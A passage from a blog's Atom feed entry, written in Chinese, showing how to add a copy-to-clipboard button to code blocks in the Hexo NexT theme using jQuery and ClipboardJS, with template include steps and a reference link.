</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $codeArea = $(<span class="string">"figure"</span>);</span><br><span class="line">    <span class="comment">//查看页面是否具有代码区域，没有代码块则不创建 复制按钮</span></span><br><span class="line">    <span class="keyword">if</span> ($codeArea.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//复制成功后将要干的事情</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">changeToSuccess</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">             $imgOK = $(<span class="string">"#copyBtn"</span>).find(<span class="string">"#imgSuccess"</span>);</span><br><span class="line">                <span class="keyword">if</span> ($imgOK.css(<span class="string">"display"</span>) == <span class="string">"none"</span>) &#123;</span><br><span class="line">                    $imgOK.css(&#123;</span><br><span class="line">                        opacity: <span class="number">0</span>,</span><br><span class="line">                        display: <span class="string">"block"</span></span><br><span class="line">                    &#125;);</span><br><span class="line">                    $imgOK.animate(&#123;</span><br><span class="line">                        opacity: <span class="number">1</span></span><br><span class="line">                    &#125;, <span class="number">1000</span>);</span><br><span class="line">                    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        $imgOK.animate(&#123;</span><br><span class="line">                            opacity: <span class="number">0</span></span><br><span class="line">                        &#125;, <span class="number">2000</span>);</span><br><span class="line">                    &#125;, <span class="number">2000</span>);</span><br><span class="line">                    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        $imgOK.css(<span class="string">"display"</span>, <span class="string">"none"</span>);</span><br><span class="line">                    &#125;, <span class="number">4000</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建 全局复制按钮，仅有一组。包含：复制按钮，复制成功回应按钮</span></span><br><span class="line">        <span class="comment">//值得注意的是：1.按钮默认隐藏，2.位置使用绝对位置 position: absolute; (position: fixed 也可以，需要修改代码)</span></span><br><span class="line">        $(<span class="string">".post-body"</span>).before(<span class="string">'&lt;div id="copyBtn" style="opacity: 0; position: absolute;top:0px;left:0px;display: none;line-height: 1; font -size:1.5em"&gt;&lt;span id="imgCopy" &gt;&lt;i class="fa fa-paste fa-fw"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id="imgSuccess" style="display: none ;"&gt;&lt;i class="fa fa-check-circle fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/span&gt;'</span>);</span><br><span class="line">        <span class="comment">//创建 复制 插件，绑定单机时间到 指定元素，支援JQuery</span></span><br><span class="line">        <span class="keyword">var</span> clipboard = <span class="keyword">new</span> ClipboardJS(<span class="string">'#copyBtn'</span>, &#123;</span><br><span class="line">            target: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">//返回需要复制的元素内容</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">document</span>.querySelector(<span class="string">"[copyFlag]"</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            isSupported: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">//支援复制内容</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">document</span>.querySelector(<span class="string">"[copyFlag]"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//复制成功事件绑定</span></span><br><span class="line">        clipboard.on(<span class="string">'success'</span>,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                <span class="comment">//清除内容被选择状态</span></span><br><span class="line">                e.clearSelection();</span><br><span class="line">                changeToSuccess(e);</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="comment">//复制失败绑定事件</span></span><br><span class="line">        clipboard.on(<span class="string">'error'</span>,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.error(<span class="string">'Action:'</span>, e.action);</span><br><span class="line">                <span class="built_in">console</span>.error(<span class="string">'Trigger:'</span>, e.trigger);</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="comment">//滑鼠 在复制按钮上滑动和离开后渐变显示/隐藏效果</span></span><br><span class="line">        $(<span class="string">"#copyBtn"</span>).hover(</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                $(<span class="keyword">this</span>).stop();</span><br><span class="line">                $(<span class="keyword">this</span>).css(<span class="string">"opacity"</span>, <span class="number">1</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                $(<span class="keyword">this</span>).animate(&#123;</span><br><span class="line">                    opacity: <span class="number">0</span></span><br><span class="line">                &#125;, <span class="number">2000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//感应滑鼠是否在代码区</span></span><br><span class="line">$(<span class="string">"figure"</span>).hover(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//-------滑鼠活动在代码块内</span></span><br><span class="line">        <span class="comment">//移除之前含有复制标志代码块的 copyFlag</span></span><br><span class="line">        $(<span class="string">"[copyFlag]"</span>).removeAttr(<span class="string">"copyFlag"</span>);</span><br><span class="line">        <span class="comment">//在新的（当前滑鼠所在代码区）代码块插入标志：copyFlag</span></span><br><span class="line">        $(<span class="keyword">this</span>).find(<span class="string">".code"</span>).attr(<span class="string">"copyFlag"</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//获取复制按钮</span></span><br><span class="line">        $copyBtn = $(<span class="string">"#copyBtn"</span>);</span><br><span class="line">        <span class="keyword">if</span> ($copyBtn.lenght != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//获取到按钮的前提下进行一下操作</span></span><br><span class="line">            <span class="comment">//停止按钮动画效果</span></span><br><span class="line">            <span class="comment">//设置为 显示状态</span></span><br><span class="line">            <span class="comment">//修改 复制按钮 位置到 当前代码块开始部位</span></span><br><span class="line">            <span class="comment">//设置代码块 左侧位置</span></span><br><span class="line">            $copyBtn.stop();</span><br><span class="line">            $copyBtn.css(<span class="string">"opacity"</span>, <span class="number">0.8</span>);</span><br><span class="line">            $copyBtn.css(<span class="string">"display"</span>, <span class="string">"block"</span>);</span><br><span class="line">            $copyBtn.css(<span class="string">"top"</span>, <span class="built_in">parseInt</span>($copyBtn.css(<span class="string">"top"</span>)) + $(<span class="keyword">this</span>).offset().top - $copyBtn.offset().top + <span class="number">3</span>);</span><br><span class="line">            $copyBtn.css(<span class="string">"left"</span>,$(<span class="keyword">this</span>).offset().left -$copyBtn.width() - <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//-------滑鼠离开代码块</span></span><br><span class="line">        <span class="comment">//设置复制按钮可见度 2秒内到 0</span></span><br><span class="line">        $(<span class="string">"#copyBtn"</span>).animate(&#123;</span><br><span class="line">            opacity: <span class="number">0</span></span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="comment">//页面载入完成后，创建复制按钮</span></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  createCopyBtns();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="5-打开themes-next-layout-custom-新建文件custom-swig，代码如下"><a href="#5-打开themes-next-layout-custom-新建文件custom-swig，代码如下" class="headerlink" title="5.打开themes/next/layout/_custom/,新建文件custom.swig，代码如下:"></a>5.打开<code>themes/next/layout/_custom/</code>,新建文件<code>custom.swig</code>，代码如下:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/lib/clipboard/clipboard.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/js/src/custom.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="6-修改文件themes-next-layout-layout-swig-在标签-lt-body-gt-上面插入代码"><a href="#6-修改文件themes-next-layout-layout-swig-在标签-lt-body-gt-上面插入代码" class="headerlink" title="6.修改文件themes/next/layout/_layout.swig,在标签&lt;/body&gt;上面插入代码:"></a>6.修改文件<code>themes/next/layout/_layout.swig</code>,在标签<code>&lt;/body&gt;</code>上面插入代码:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include &apos;_custom/custom.swig&apos; %&#125;</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://ppundsh.github.io/posts/8e7e/" target="_blank" rel="noopener">Flymia的HEXO添加複製功能</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hexo next（5.1.3+）添加代码块复制功能&lt;/p&gt;
    
    </summary>
    
      <category term="Blog搭建" scheme="http://0clickjacking0.github.io/categories/Blog%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
</feed>
